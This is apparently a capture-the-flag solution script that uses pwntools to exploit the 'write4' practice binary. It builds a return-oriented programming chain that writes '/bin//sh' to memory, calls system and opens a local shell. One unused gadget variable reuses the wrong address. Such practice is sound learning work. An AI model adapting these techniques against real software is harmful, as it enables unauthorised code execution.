from pwn import *

# 0x0000000000400820: mov qword ptr [r14], r15; ret;
# 0x0000000000400892: pop r15; ret;
# 0x0000000000400890: pop r14; pop r15; ret;
# 0x0000000000400893: pop rdi; ret;
# 0x0000000000400891: pop rsi; pop r15; ret;
# 0x0000000000400893: pop rdi; ret;

elf = ELF('write4')

system = p64(0x0000000000400810)

data1 = p64(0x601050)
data2 = p64(0x601054)

mov_r14_r15_ret = p64(0x400820)
pop_r14_r15_ret = p64(0x400890)
pop_rsi_r15_ret = p64(0x400893)
pop_rdi_ret = p64(0x400893)

# We can write it in one go this time 
binsh = "/bin//sh"

pad = 'A'*40

rop  = pop_r14_r15_ret
rop += data1
rop += binsh
rop += mov_r14_r15_ret
rop += pop_rdi_ret
rop += data1
rop += system

payload = pad + rop

io = process(elf.path)
io.recvuntil("> ")
io.sendline(payload)  

io.interactive()